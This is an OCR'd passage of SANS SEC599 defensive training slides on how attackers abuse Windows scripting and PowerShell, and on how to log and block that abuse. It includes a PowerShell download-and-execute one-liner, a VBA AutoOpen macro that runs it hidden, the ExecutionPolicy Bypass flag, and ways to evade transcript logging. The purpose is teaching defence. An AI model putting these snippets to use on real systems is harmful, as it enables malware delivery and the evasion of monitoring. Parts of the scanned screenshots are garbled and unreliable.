In the example above, we see JavaScript that starts with eval(function(p,a,c,k,e,r) . .. This is a well-known JavaScript obfuscation method, for which online deobfuscators can be found: http: / /matthewfl.com/ unPacker.html
This kind of obfuscation makes it even harder for security applications like anti-virus to detect malicious code: obfuscated JavaScript is not only used by malware authors, but also by benevolent actors on the Internet. Web developers used it to try to protect their intellectual property, advertisement companies use it to hide the redirections they make...
For the analyst, obfuscation techniques with eval functions are also harder to analyze.

© 2017 Erik Van Buggenhout & Stephen Sims

167

I
PowerShell

IPowerShell is Microsoft's object-oriented scripting language. It supports the .NET framework.
IIt is a powerful language that can interface with older technologies like the Windows API and ActiveX, and with new technologies like .NET.
IMicrosoft learned from its security mistakes with older scripting languages, and has taken steps to try to prevent abuse by PowerShell scripts.

PowerShell PowerS he ll was introduced in 2006 as a new object-oriented scripting language. The first version ( 1.0) had to be installed on Windows operating systems like Windows XP, but s ince Windows 7.0, PowerShell (version 2.0 and later) is integrated into the Windows operating system.
At the time of writing the latest version ofPowerShell is 5.1, and in 2016 PowerShell was released as opensource software, opening the path to cross-platform versions of PowerShell.
PowerShell is built on .NET technology, and thus supports the .NET framework for scripting. But it can also use older Microsoft technology like ActiveX and the Windows APL This means that very powerful scripts can be written by adversaries to attack enterprise machines. Scripts can be developed that operate completely in memory, avoiding detection and monitoring. PowerSploit is one example of a red team PowerShell framework.
PowerShell uses cmdlets (command-lets), for example, a ping command from PowerShell can be executed with the Test-Connection cmdlet:
Test-Connection 127.0.0. I
With the introduction of PowerShell, Microsoft took some design decisions to improve security and avoid abuse of this new scripting capability, like witnessed in the past with VBS, VBA, and JS.

168

© 2017 Erik Van Buggenhout & Stephen Sims

Opening PowerShell Scripts
This PC > Boot (C:} , demo

Extension
PowerShell scripts are stored as text files with extension ps I.

hello ps1 · Uotepad
File Edit format Votw Help
Write-Host "Hello"

Restricted execution
Additionally. the execution of .ps I files is also governed by an execution policy. By default, the execution policy is set to "Restricted", and .psI files cannot be executed when they are loaded into the PowerShell shell.

· X
Editing scripts
When a .ps I is
opened (for example doubledicked}, by default Notepad is launched to edit the content of the .psI file.
The PowerShell script is not executed.

Opening PowerSbell Scripts PowerShell scripts are contained in text files with extension .ps I. To avoid abuse like with the Windows Script Host, where .vbs, .js . .. scripts can be executed just by double-clicking, the .ps I extension is associated with notepad. When a file with extension .ps I is opened in Windows Explorer (for example by double-clicking the icon that represents the file), notepad.exe is launched to edit the file. This prevents attacks similar to e-mailing malicious .vbs or .js files.
User awareness concerning ps 1 files is important, even if they can do no harm when double-clicked. There are how-tos floating around on the Internet, explaining how to change the default configuration ofWindows to launch PowerShell scripts when they are double-clicked. From an administrative standpoint, this is easier, as the user can be instructed to double-click administrator provided ps I files for ad-hoc troubleshooting. But it introduces a new risk. Therefore, it is best to raise user awareness and instruct users not to change the default settings. A company policy prohibiting the change of these security settings is something to consider.
The execution of .ps I fi les is also governed by an execution policy. By default, the execution policy is set to Restricted, and .psi files cannot be executed when they are loaded into the PowerShell shell.
Microsoft took these security design decisiu11s and implemented these restrictions to limit the abuse of PowerShell scripts. As was to be expected, malicious actors found other ways to abuse PowerShell and it has become a very powerful tool used by adversaries and red teams. The fact that it is integrated into Windows makes PowerShell as the goto exploitation and post-exploitation tool. As an initial intrusion tool, it is not that suited, because of Microsoft's design decisions. Psi files can be artifacts ofa successful intrusion and user awareness should encourage users to report these files to the proper team. This includes administrators, whom are more familiar with psi files and could brush off these artifacts as non-incidents.

© 2017 Erik Van Buggenhout & Stephen Sims

169

Bypassing the ExecutionPolicy

SANS
Bypassing the Executio nPolicy PowerShell scripts contained in .ps 1 files cannot be executed by simply invoking the powershell.exe shell and passing the script file as an argument (-File hello.ps i). This will not be allowed by the default execution policy. The default PowerShell execution policy is set to Restricted, prohibiting the execution of .ps1 files passed as arguments.
The same happens inside the PowerShell shell when a .ps I file is loaded, for example, .\hello.ps I. The execution policy will prevent the hello.ps I script from executing.
The PowerShell execution policy can be checked by using the Get-ExecutionPolicy cmdlet: this will return the value Restricted.
It is possible to bypass the PowerShell execution policy by using option - Execution Policy when starting the PowerShell shell (powershell.exe). If this option is given the value Bypass, the execution policy will be bypassed and the script inside the .ps I file will execute.
A scenario where attackers e-mail users a .ps I file and then instruct the user to save the file to disk, open a command-line to launch PowerShell with the execution policy bypass argument to t:Xt:l:ute the saved .psl file is very unlikely. Using .ps I fi les as the initial delivery vector is virtually non-existent, as PowerShell is configured by default to prevent the execution of .psI files. Only badly configured environments are prone to th is attack.
However, PowerShell is often used in blended attacks, for example with a malicious Office document (VBA
code) or mal icious JScript files. In these blended attacks, VBA, VBS or JS is just used to start PowerShell and execute malicious scripts.

170

© 2017 Erik Van Buggenhout & Stephen Sims

Passing Powe rShell Scripts Through the Command Line

ii SEC599
:\demo>powershell -Convnand "~/rite-Host 'Hello'" ello
:\demo>

D X

Co m mand line scripts
PowerShell scripts can be passed directly as a command line argument.
This is not prevented by the execution policy.

$oWC = New-Object System.Net.WebClient; $url = 'http://example.com/malware . html';
$file = $Env:temp + '\malware . exe ' ; $oWC.DownloadFile($url, $file );
$oShell =New-Object-com shell.application; $oShell.shellexecute($file);

Passing Powe rShell Scripts Through the Command Line The PowerShell execution policy with its Restricted setting applies to .ps I files. It does not apply to interactive commands typed into the PowerShell shell by a user or administrator.
The same applies to interactive commands passed to the PowerShell shell upon invocation through the command-line. The option -Command allows interactive commands to be passed to the PowerShell shell, to be executed when the shell is instantiated.
As can be seen in the example above, the PowerShell cmdlet Write-Host is used here with a string 'Hello': Write-Host 'Hello'.
This small PowerShell command is enclosed between double quotes and used as the value for option Command. T he cmdlet is executed without a restricting policy (the output Hello is printed to the console).
This is a useful option for attackers to use in a blended attack. The -Command can be used to launch PowerShell from inside another script, for example JScript. There are powerful one-liners available to attackers, like this PowerShell script to download and execute a payload (PE file):
$oWC = New-Object System.Net.WebClient; $url = 'http://example.com/malware.html'; $file = $Env:temp +
'\malware.exe'; $oWC.DownloadFile($url, $file); $oShell = New-Object-com shell.application; $oShel I.she!!execute($Iile);

© 2017 Erik Van Buggenhout & Stephen Sims

171

PowerShell Encoding

i i SEC599

(J

" : \demo>powershell - EncodedCommand Vt48yAGkAdA8lAC0ASABvAHMAdAAgACcA
SABlAGwAbABvACcA Hello

C;\de1110>

~metasploir

Veil - Framework

0 ~

Payload generation
This technique is often used by offensive payload generation tools such as Veil, Metasploit & Empire.

Base64 encoding
PowerShell scripts can be BASE64 encoded and passed directly as a command-line argument.
This is not prevented by the execution policy.

PowerShell Encoding Many PowerShell scripts can be found on the Internet, with amongst them many powerful one-liners like the one we saw in the previous slide. But it's not always easy to write a complex script as a one-liner, and sometimes characters need to be used that will be interpreted by the shell that is used to launch the PowerShell shell (for example the cmd.exe shell).
As a solution to this problem, Microsoft allows script passed as argument via the command-line to be BASE64 encoded. This solves the problem of special characters interpreted by another she!I (standard BASE64 is j ust letters and numbers and the characters +, / and =), and also allows the use ofscripts composed of more than one line (newline characters are allowed).
The BASE64 encoded PowerShell script is passed via option -EncodedCommand, as can be seen in the example above.
Any .ps I script can be taken, converted to UN ICODE, then converted to BASE64 and then used with the EncodedCommand. The only limit is the shell (e.g. cmd.exe) limiting the size ofthe command-line arguments. T his can be done with PowerShell, as is explained in powershell.exe's help:
# To use the -EncodedCommand parameter: $command = 'dir "c:\program files"' $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -encodedCommand $encodedCommand

172

© 2017 Erik Van Buggenhout & Stephen Sims

Launching PowerShell from VBA

Sub AueoOpem () serPowershellComD'.and · "SoWC · New-Object: Syseem.Nee . WebCliene;" ·
"$url = 'heep: //example.com/n:.alware.heml':" +
"Stile· SEnv:eerop ~ ' \ malware.exe';" + "SoWC.OownloadFile(Surl,Sfile);" + "$o5hell · New-Ob j ect: -com shell.application;"+
"SoShell.shellexecute(Sfile);"

Ble nded attack
This is an example of a blended attack:VBA code that launches a PowerShell
cornn1and.
The PowerShell command is a downloader.

See oShell · CreateObJece ("WScripe.shell") serCommand · "powershell -Command"" " & serPowershellCommand & """" oShell.Run serCommand, 0 End Sub

Launching PowerSheUfrom VBA The above example is a blended attack: AWord document with VBA code that executes upon opening of the Word document. The VBA code is just a few lines to launch a PowerShell command.
CreateObject Wscript.Shell is used to create an ActiveX object that allows the execution of a command (run). We have seen this in previous (VBA) examples. A string is concatenated (strCommand) to launch the PowerShell shell with a -Command option.
The PowerShell command to be executed is contained in string strPowershellCommand: this script is a set of statements to download a tile (using a .NET object) via HTTP and write it to disk in a temporary folder, and then execute the downloaded file (using an ActiveX object).
Remark that the execution policy does not apply in this case: there is no PS I script written to disk, the PowerShell instructions are just passed via the command-line.
The fact that the script is not wr itten to disk, makes it harder to detect by AV and leaves less forensic artifacts behind.

© 2017 Erik Van Buggenhout & Stephen Sims

173

PowerShell Obfuscation (I)

YHTAX l nvoke-Exp>'eo:i<Jn C-C-0-andl <st.-ing> C<Co-nPAraAetero> J
LIASES ie><

EIIA~-Holp cannot r ind the Help file· ror thu ctOdlet on thlt co,oputer. It i~

dh~"r!"~o:::i:,.r-:~~"}n~!ri u·· ctOdlet,

Update- Help.

Help f ilea for the "°dule thet include· this

-- To view the Help topic for- this e!Odlet online, type: ''Get-lielp l nvok o - Ex·pl'"C'ssion - Online 0 or

go to http://go.11icroooft .eoovfwlinlv?Linkl0·113343.

C:'<l.,,o>

Invoke-Expression obfuscation
PowerShell scripts too can be obfuscated to avoid detection and to frustrate analysis.
Like ]Script, PowerShell has a ··function" to interpret a string as a PowerShell script.

PowerSheUObfuscation (1) Like VBScript and Jscript, adversaries can obfuscate PowerShell scripts to bypass detection software like antivirus and to make the work of malware analysts harder. Code obfuscation and string obfuscation are both obfuscation techniques that can be applied to PowerShell scripts too.
With JScript (and JavaScript in general), we discussed the eval function. This is a function that takes a string as argument and interprets the string as a JScript script. This allows for the complete obfuscation (via string obfuscation) of a script.
PowerShell has similar functionality: The Invoke-Expression cmdlet is the PowerShell equivalent of the eval function.
To get more information about a particular cmdlet, one can always use the help ofGet-Help cmdlet with the name ofthe cmdlet as argument. In the example above, we see the help for invoke-Expression by issuing statement Get-Help Invoke-Expression.
From the help, we can understand that this cmdlet takes a string as argument. Notice the alias too: iex. T his means that cmdlet Invoke-Expression cnn be called with iex too: The uM: uf iex is something commonly observed in malicious PowerShell scripts.

174

© 2017 Erik Van Buggenhout & Stephen Sims

PowerShell Obfuscation (2)

PowerShell Obfuscation (2) In this PowerShell obfuscation example, we see cmdlet Invoke-Expression and its alias iex used with the same expression:
(("56 71 68 73 64 2C 47 6E 72 73 IF 26 47 64 68 6E 26" -split'' I ForEach-Object {[char]((byte]"0x$_" +
!)})-join")
Before we analyze this expression, let's disclose the obfuscated string:
Converting hexadecimal data "56 71 68 73 64 2C 47 6E 72 73 1F 26 47 64 68 6E 26" to a string results in this string: "Vqhsd,Gnrs&Gdkkn&" Adding integer I to each character (byte) in this string produces this string: "Write-Host 'Hello"' This string contains a valid PowerShell expression, it displays Hello on the console when it is executed with Invoke-Expression.
ln the expression, the string with the hexadecimal characters is split into separate strings, containing just one byte (-split' '). Each of these "byte" strings is converted to a byte ([byte]"0x$_") using ForEach-Object. Integer I is added to each byte(+ I), and tht:n il is converted to a character ([char]). ForEach-Object thus produces a list of characters, which are concatenated together (-join"). And finally, the string is interpreted as a PowerShell script.
Like JScript obfuscation, PowerShell obfuscation can be very complex (for example with nested obfuscation) because of cmdlet Invoke-Expression. And it also allows creating polymorphic malware.

© 2017 Erik Van Buggenhout & Stephen S ims

175

PowerShell Monitoring and Logging
IPS I files might not execute by default because of the execution policy, but completely preventing PowerShell commands from running is hard.
Monitoring and detecting PowerShell execution can be done via transcripts and Windows event logs.
IITranscripts and event logs need to be configured.
SANS
PowerShell Monitoring and Logging Preventing execution of PowerShell commands a ltogether is not that easy.
There is the execution policy that prevents execution of PS I script files by default, but this is not a real security barrier, it is more meant as prevention of accidental execution of scripts, for example by social engineering users into opening a malicious PS l attachment. But if an attacker can launch the PowerShell shel I (powershell.exe), then ad-hoc PowerShell commands can be executed, even PS l files by bypassing the execution policy.
There is no g lobal registry setting (like for the Windows Script Host) to disable PowerShell. Execution ofthe PowerShell shell can be prevented by blocking powershell.exe. This can be done by various means, like with the prevention of executing any executable:
· Removing the powershell.exe · Placing ACLs on powershell.exe · Block powershell.exe with application whitelisting
Remark that for many of these solutions, the 32-bit and 64-bit powershell.exe executables need to be taken into account.
As an alternative measure to preventing PowerShell execution, it's possible to monitor and detect execution via transcripts and the Windows event log. This is partially configured by default, but extra configuration is needed to benefit from all the transcript and logging features.

176

© 2017 Erik Van Buggenhout & Stephen Sims

Configuring Pow erShell Transcripts

;,.i~ . , ~~·,·:·--··I

:-...ie...,>type C:'sllsers,root'J>ocu-nts,WindowsPowerShell'"icrosoft.PowerShell..J)i'O£ ·

=~·"" le.psi
ta..t - TrMscript --OUtputDirectoa·y c

- Inc lu.de I nvocat ionHeader

c

,r~~f: ;~;~!:~· :'-<le...,)powershell - ExecutionPolicy bypass -Co_..nd "I/rite- Host 'Hello' .. output file is c:,de...,~o..,..rShell_transcript.11?- 81.EsHqLl'Cff.

1

ello

:'-<le...,)dir Uol...- in drive Chu no la.bel. Uoluae SeriAl 14u,.1,e,. is P43?- E4C4

<DIR> <DIR>

1.08'1 p~..,....Shell_trans cript .\l?-01 .E!:HqLl'Cff.281?058

1 Pile<s >

1.811'1 bytes

2 Dir<s > 1(,.468.S82.488 bytes free

Starting transcripts
Command transcripts can be started with Sr.,rt-Transcript.
This can be configured in the user·s profile.
A transcript will be created for each PowerShell invocation.

Configuring PowerShell Transcripts A transcript of all executed PowerShell commands together with their output can be saved to transcript files. This is done with the Start-Transcript cmdlet.
To start a transcript for all PowerShell invocations for a particular user, the Start-Transcript cmdlet can be put inside the user's PowerShell profile (a PS 1script pointed to by variable $profile).
In the example above, we see that the user's PowerShell profile (Microsoft.Powershell_profile.ps 1) contains the command Start-Transcript-OutputDirectory c:\demo - lncludelnvocationHeader. This will cause the creation of a new transcript file each time powershell.exe is launched for this user, as can be seen in the example above when PowerShell is used to print Hello to the console: a new transcript file (PowerShell_ transcript. . .) is created in the c:\demo directory.
Since the PowerShell profile is a ps I file, the default execution policy will prevent the loading and executing of the profile script (this is why we used - ExecutionPolicy Bypass in the example). Hence this method can
on ly be used ifan organization changes the default execution policy, for example to AIISigned, then the
profile ps I script must be digitally signed by a trusted publisher.
This method is also easy to bypass when it is put in place. A couple of ways to bypass: · Stop tracing by starting the malicious script with stop-transcript · Bypass the PowerShcll profile with option - NoProfile · Delete the transcript files
Starting with PowerShell version 5.0, system-wide transcripts can be configured via the registry.

© 2017 Erik Van Buggenhout & Stephen Sims

177

Transcript Files

:'4e1110)type rove..Shel;l_tt'-,,sc·ipi .V?-e.1.Et:"'1t.t"Ol .28J?l59916U13 .o:t
.,.~do14 fo14r$Nll U·..,.u:ript s tart
··rn·n.~ t6r-t tlM: 2811158'91'1113 V?- 91'-rool Aa U·er: Vl-81,Hot chin·:: W?--9:t OU.cro,o(t UU.d.ovs KT ,.1.7'81 SeNiU hck 1> o·t fap-plicathn: po\Nt,..hell ..b-ec1i1tionPollc,- byp,u· - Co~d. ""ite--Ho.st 'Me llo '
c·n io: 1631: Vor·lon: S.t.14489.ltes
~M:lrt.i!o.!,~-:!:D~e··~k!to:~p ;~1:.,~iJs1·
RU·ntot»: 4.l.313t,.4ilel n.nso.ckUH··tan : 3 .8 R.Mth9P'rotoeol1Jer-·fon: 2 .3 ··UU1H.ttonue,.·ion: 1.1 .8.1

Transcript sample
This is an example of a transcript.
Because of the lncludelnvocationHeader option, the transcript contains detailed information.
The commands together with their output appear in the transcript.

SANS
T ranscript Files PowerShell transcripts were not designed by Microsoft to be used for monitoring and detection, but more as a convenience function for administrators. Nevertheless, it is worth considering to configure transcripts if extended Windows event logs cannot be produced (see next slides).
A transcript file is created for each invocation ofpowershell.exe. Because we included option lncludelnvocationHeader in the Start-Transcript command, the transcript fil e contains extra information.
First, we see a timestamp (Start time) when PowerShell was launched, together with execution metadata, like the usemame, computemame, and the command-line.
A bit later in the transcript, we see the command we executed, together with the produced output: PS> Write-Host ' Hello' Hello

178

© 2017 Erik Van Buggenhout & Stephen Sims

Windows PowerShe ll Logs

1.,.,,,,,.,.,:::-:-

, _ ,_
UA(
............ i,JA(..f,l({ftl,f

w 'v ""' --
©w-

· -i \QMIOOl

(l)-

. -W-

(l)-
· hl

. .W......I..-.. ~""'-- > 'NIP

. --.'-=

....... ~
~

-Q w~·

. -w-··

W""'6(fl:(Millf

·~--. .....

----· .mw......
· ~
--~~:~-
·i;i fhoo,l'-~·1
-"-~·.....sw

...........
J~J'llJldl t.aosnol711J.ll7
M5,.'201J'UJJJ1
MW201fUJ).J1
MSl»tl Q,ilJ'
hi ,tl!Uil
<f-tl!\r;nn , , 1t - t t

---

The command-line is included in the event log entry.
..,_ ._ l-,g,td ·~·>nu.r,
ld.<-t-,, ~Ll~fc

-

"'1«

t>M.m ,aa~ .oi t,....u-,c,c
-IOO l""'""UI~ 400 " . . . .~K)'CII, 1iOO ~I.Wqlt
w:±otHB IM)O.__,_U~
--"' ~ , I ~

PowerShell logs
This is the Windows Log / Windows PowerShell log.
It contains high-level events when the PowerShell engine is started and stopped. Events can contain command-line data.

Windows PowerShell Logs PowerShell logs information to specific Windows event logs. One log can be found in the Windows event viewer, under Windows Logs/ Windows PowerShelt.
This log provides events concerning the PowerShell engine. It wilt contain events each time the PowerShell engine is started and stopped, together with events for the different PowerShelt engine providers.
These events can contain command-line data, like in the example above: HostApplication= powershell Command Write-Host ' He llo'.
Because the PowerShell instructions were passed via a command-line argument, they were logged in the event log. !fa ps i file is executed, then we will see the name of the psi file in the event log, but not its content.
This event log can be used in forensic investigations to detennine if and when PowerShell was used, but it can also be used for monitoring . Event logs can be centralized, and alerts generated when particular events occur.
This event log is populated by default, no special configuration is needed to generate this log.

© 2017 Erik Van Buggenhout & Stephen Sims

179

Supplemental Pow erShell Logs

-Jf Registry Ed11<>r
Filt Edit Vioew Favo«ttt Help
· CunentVm,on ~
lnttmtt Setting
· Powtf'ShtH ScnpUlloc~ Powtr Sy,i"temals ~ ~re.Inc. System 1/ol,tile Enwonmtr1t HKEY_LOCAl_MACHIN~ HKEYJJSERS HKEY_CURRENT_CONFIG

Name

Typt

» (O~·uh)

REG_SZ

m' En·bltScriptBlo... REG_0WORD

,.

D·ta (v·lu· not <tt) OxOOOOOOOl (1)

Computel\HKEY_CUIW.NT_USER\Softwlrt\ Policies\ Miuosoft\Windows\Powe&tll\ScriptBlocklogging

A dditional logs
Extra PowerShell log events can be generated by configuring the registry.
Here is an example of a setting to enable Script Block logging: this is very useful to monitor and detect PowerShell abuse.

S upplemental PowerShell Logs Starting with PowerShell version 5.0, the generation ofsupplemental log events can be configured. These logs can be found in the Windows event viewer under Applications and Services Logs/ Microsoft / Windows I PowerShell / Operational.
To generate events for this event log, PowerShell needs to be configured. This can be done by GPOs or the registry, as explained in this Microsoft blog post: https://blogs.technet.microsoft.com/ashleymcglone/20 I7/03/29/practica1-powershel1-security-enable-auditinga n d -1oggi ng-wi th- ds c /
One ofthe very interesting event log entries to enable is Script Block logging: each time a block of PowerShell script is executed, the code ofthe script is captured in an event log entry.
To enable this via the registry, key ScriptBlockLogging must be created in HKLM:\Software\Policies\Microsoft\ Windows\PowerShel I and HKCU:\Software\Policies\ Microsoft\Windows\PowerShell. Inside this key, DWORD value EnableScriptBlockLogging must be created and g iven a value equal to I.
There are several other settings that influence PowerShell event logging, please refer to the blog post mentioned for more details. When configuring extra logging, it can be interesting to also increase the size of the Windows event logs.

180

© 2017 Erik Van Buggenhout & Stephen Sims

PowerShell Script Block Logging

,,-.

_ NTtM

Opet·lioNI Number of event>: 115

Offlint Fil,s P,r<nblContrc

tevd

O·t·and Timt

Source EVfflt lO Task C.··

Script Blocl< logging

- PtopltNtarMt Ovmos·

9/05/2017 17:13:38

PowerS...

4104 Ex«ut...

Powmhdl

' Verbose

91!15'201717:13-37

P ~-

4104 £.«cut..

By enabling Script Block

n(;l Admin Opuati0N

Q)1nrormwon 9/05/2017 17:13:37
@lnform,tion 9/05/201717:U:37

PowtrS... PowvS...

40962 Pow..S... 53!i04 PowtrS...

logging, event entries with ID 4104 are created in the

,-..

<D ~ POW<fShdl·O·

Information 9/05/201717:13:37

Powt1S... 40961 PowtrS...

Operational log of

..1 Pnm1tyNttwo Print~·
... RudyBoost

Q Vf1t>oK Ovt<bo~

9/05/2017 16:11:U 9/05/2017 16:11;13

PO\lo..S.Powt~..

__ 4104 Ex«ut...
4104 Ex«,u..t....

PowerShell.

,...,

ReadyBoo,tOn Rt<ov")'

~410(, Powe<Shdl (Mi<tosoft·Windew<·POwt<_Shd...f;);___ __

These events contain the source code of the

,,-.

· Rt hab,hty·Ana

Gentr1I~,~

executed scripts.

,,...

· Remot<App ar .., RtmoteAs.,.t·

Cruong Scnptbl<><:k tcitt (l of1):

Rtmot.Oe.ldo

Write-Haff 'Hdlo'

RemottOe.l:to Reoource· Exh· · Resource-Exha

Sc-r,ptBlockID: 772d0f4-7f67-<lfu·93ld·a04160a16619 Path:

r--

PowerShe ll Script Block Logging Windows event logs with ID 4104 are created in the Operational log of PowerShell when Script Block logging is enabled.
For every block of script executed by the PowerShell engine, an event 4104 is logged with the source code of the block ofscript that was executed.
As can be seen in the example above, the event 4104 reports execution of code Write-Host ' Hello'. The power that brings this script block event logging, is that we obtain a trace ofexecuted PowerShell code, regardless of how the code was delivered.
The code can be executed interactively, via-Command, -EncodedCommand (BASE64), -File (ps I) ... In all these cases, the executed script will be logged.
One can imagine that with frequent executions of PowerShell scripts, a lot of events will be generated. Depending on your environment, the level of logging needs to be tuned, and the size ofthe Windows event logs need to be increased. Otherwise, you run the risk of losing events unless your enterprise has the capability and capacity to centralize a ll logs from servers an<l workstations.

© 2017 Erik Van Buggenhout & Stephen Sims

181

Scripting in the Enterprise - Introducing "Hardentools"

Hardentools (by Claudio Guarnieri) is a collection of simple utilities designed to disable a number of "features" exposed by operating systems (Microsoft Windows), and primary consumer applications.

Available at https://github.com/securitywithoutborders/hardentools

What does it do? · Disable Windows Script Host · Disable AutoRun & AutoPlay · Disable PowerShell

· Disable Office Macro's & OLE object execution · Disable ActiveX · Disable JavaScript in PDFs

Scripting in the Enterprise - Introducing "Harde ntools" Hardentools is a collection ofsimple utilities designed to disable a number of"features" exposed by operating systems (Microsoft Windows, for now), and primary consumer applications. These features, commonly thought for Enterprise customers, are generally useless to regular users and rather pose as dangers as they are very commonly abused by attackers to execute malicious code on a victim's computer. The intent ofthis tool is to simply reduce the attack surface by disabling the low-hanging fruit.
What does the tool do? (From https://github.com/securitywithoutborders/hardentools)
· Disable Windows Script Host. Windows Script Host a llows the execution of VBScript and JavaScript files on Windows operating systems. This is very commonly used by regular malware (such as ransomware) as well as targeted malware.
· Disable AutoRun and A utoPlay. Disables AutoRun / AutoPlay for all devices. For example, this should prevent applications from automatically executing when you plug a USB stick into your computer.
· Disable powershell.exe, powershell_ ise.exe and cmd.exe execution via Windows Explorer. You will not be able to use the terminal and it should prevent the use of PowerShell by malicious code trying to infect the system.
· Sets User Account Control (UAC) to always ask for pe rmission (even on configuration changes only) and to use "secure desktop".
· Disable Macros. Macros are at times used by Microsoft Office users to script and automate certain activities, especially calculations with Microsoft Excel. However, macros are currently a security plague, and they are widely used as a vehicle for compromise. With Hardentools, macros are disabled and the "Enable this Content" notification is disabled too, to prevent users from being tricked.
· Disable OLE object execution. Microsoft Office applications are able to embed so-called "OLE objects" and execute them, at times also automatically (for example through PowerPoint animations). Windows executables, such as spyware, can also be embedded and executed as an object. This is also a security disaster which we observed used time and time again, particularly in attacks against activists in repressed regions. Hardentools entirely disables this functionality.

182

© 2017 Erik Van Buggenhout & Stephen Sims

· .Disabling ActiveX. Disables ActiveX Controls for all Office applications. · Disable JavaScript in PDF documents. Acrobat Reader allows executing JavaScript code from
within PDF documents. This is widely abused for exploitation and malicious activity. · Disable executio n of objects embedded in PDF documents. Acrobat Reader also allows executing
embedded objects by opening them. This would normally raise a security alert, but given that legitimate uses ofthis are rare and limited, Hardentools disables this.

© 2017 Erik Van Buggenhout & Stephen Sims

183

Scripting in the Enterprise - Conclusion
I
IIt must be clear by now that Windows scripting is powerful and ubiquitous.
IThis was a non-exhaustive list of Windows· scripting capabilities. Adversaries always look for new methods to abuse scripting.
IBlended attacks will mix different scripting technologies to achieve initial intrusion.
Scripting in the Enterprise - Conclusion VBS, VBA, JS, PS I ... : these scripting technologies are often abused by adversaries, because they are powerful and pervade the enterprise. Detecting and preventing abuse of scripting capabilities is key to detect and prevent initial intrusion. Since the end of2014, malicious documents leveraging VBA macros are at the forefront of maIware attacks, often used to deliver ransomware. Advanced adversaries use malicious documents too, as can be witnessed in the BlackEnergy attacks on power infrastructure. PowerShell is a very powerful framework that can be abused by adversaries to expand their foothold in the initial intrusion. Microsoft Windows' support many scripting technologies. We took a look at important scripting technologies, but this is by no means an exhaustive overview. Adversaries are always on the lookout for new methods to abuse ex isting scripting capabilities. We will give an example in the next slide. Blending scripting technologies has become common practice now: malicious MS Office documents that use VBA to launch PowerShell scripts, PDF documents that contain an embedded Word document with macros...

184

© 2017 Erik Van Buggenhout & Stephen Sims

Controlling Scripting - Additional Resources
Some additional resources that can prove to be useful include:
· https: //technet.rnicrosoft.com/ en-us/library/ee198684.aspx Disabling Windows Script Host - Microsoft TechNet article
· http://hardcnwindows1oforsecurity.com/ Community resource on Windows 10 hardening
· https://gjthub.com/securitywithoutborders/hardentools Hardentools toolkit to harden Windows environment
SAN.~
Controlling Scripting - Additional Resources Some additional resources that can prove to be useful include: https://technet.microsoft.com/en-us/ library/ee 198684.aspx Disabling Windows Script Host - Microsoft TechNet article http://hardenwindowsIOforsecurity.com/ Community resource on Windows IO hardening https:/ / github.com/securitywi thoutborders/hardentools Hardentools toolkit to harden Windows environment

© 2017 Erik Van Buggenhout & Stephen Sims

185

Course Roadmap
· Day 1: Knowing the Adversary, Knowing Yourself
· Day 2: Avertine Payload Delivery
· Day 3: Preventing Exploitation
· Day 4: Avoiding Installation, Foiling Command & Control & Thwarting Lateral Movement
· Day 5: Exfiltration, Cyber Deception & Incident Response
· Day 6: APT Defender Capstone

SEC599.2
Strategies for Preventing / Detecting Payload Delivery End-User Security Awareness Leveraging Suricata IDS/ IPS E-mail Security Controls
Exercise: Building a Sandbox Using Suricata & Cuckoo Zooming in on YARA Rules
Exercise; Finding the Needle in the Haystack Using YARA Web Security Controls
Exercise: Deploying PfSense Firewall with Squid & ClamAV Stopping Delivery Using Removable Media Visualizing the Results of Our Solutions
· Exercise: Developing Eye-Candy Using Kibana Controlling Script in the Enterprise Exercise: Controlling Script Using GPO's

SAN~

This page intentionally le ft blank.

186

© 2017 Erik Van Buggenhout & Stephen Sims

Exercise - Controlling Script Using GPOs
IThe objective of the lab is to configure Windows domain-level GPOs (Group Policy Objects) that can be used to control script execution in the enterprise. We will configure and enforce our hardening controls from our central domain controller.
High-level exercise steps: 1. Create a GPO that will:
Disable Windows Script Host using the registry Disable PowerShell scripts using Software Restriction Policies 2 . Enforce GPO across the Windows domain environment 3. Test actual blocking of our payload execution
· SA~~
Exercise - Controlling Script Using GPOs The objective of the lab is to configure Windows domain-level GPOs (Group Policy Objects) that can be used to control script execution in the enterprise. We will configure and enforce our hardening controls from our central domain controller.
We have seen a number of ways for an attacker to execute scripts on user's devices. We will make sure all of the aforementioned script types are blocked fi-om running. In short, we will:
I. Create GPO that will: Disable Windows Script Host using the registry Disable PowerShell scripts using Software Restriction Policies
2. Enforce GPO across the Windows domain environment 3. Test actual blocking ofour payload execution

© 2017 Erik Van Buggenhout & Stephen Sims

187

Exercise - Controlling Script Using GPO's - Conclusion

During this lab, we implemented GPOs to block script execution on domain-connected systems

We blocked execution of:

· VBS and JS script using WSH · PowerShell

8

As a result, the effectiveness of payloads delivered on end-point

systems is reduced: Even if they are not caught "in transit" by

sandboxes, web proxies... we will prevent them from executing!

SANS

Exercise - Controlling Script Using C PO's - Conclusion During this lab, we implemented GPOs to block script execution on domain-connected systems.
In particular, we blocked execution of: · VBS and JS script using WSH · PowerShell
As a result, the effectiveness of payloads delivered on end-point systems is reduced: Even if they are not caught "in transit" by sandboxes, web proxies, .. . we will prevent them from executing:
· Attackers won't be able to execute malicious code through Office macros (VBA); · Scripts that make use ofthe Windows Script Host (WSH) are blocked as well, since we disallowed
WSH from executing; · Directly loading payloads using PowerShell is not effective as the use of PowerShell is not allowed.
It should be noted that security controls can be further strengthened, but this will always go at the cost of usability & flexibility. How far you can go with these type ofcontrols depends on the organization and the type of users (e.g. an office manager typically doesn't require the execution ofcustom scripts, while an IT
administrator might need this).

188

© 2017 Erik Van Buggenhout & Stephen Sims

Course Roadmap
· Day 1: Knowing the Adversary, Knowing Yourself
· Day 2: Averting Payload Delivery
· Day 3: Preventing Exploitation · Day 4: Avoiding Installation, Foiling
Command & Control & Thwarting Lateral Movement
· Day 5: Exfiltration, Cyber Deception & Incident Response
· Day 6: APT Defender Capstone

SEC599.2
Strategies for Preventing/ Detecting Payload Delivery End-User Security Awareness Leveraging Suricata IDS / IPS E-mail Security Controls
Exercise: Building a Sandbox Using Suricata & Cuckoo Zooming in on YARA Rules
Exercise: Finding the Needle in the Haystack Using YARA
Web Security Controls Exercise: Deploying PfSense Firewall with Squid & ClamAV
Stopping Delivery Using Removable Media Visualizing the Results of Our Solutions
Exercise: Developing Eye-Candy Using Kibana
Controlling Script in the Enterprise
Exercise: Controlling Script Using GPO's

SAN~
This page intentionally left blank.

© 2017 Erik Van Buggenhout & Stephen Sims

189

Conclusions for 599.2
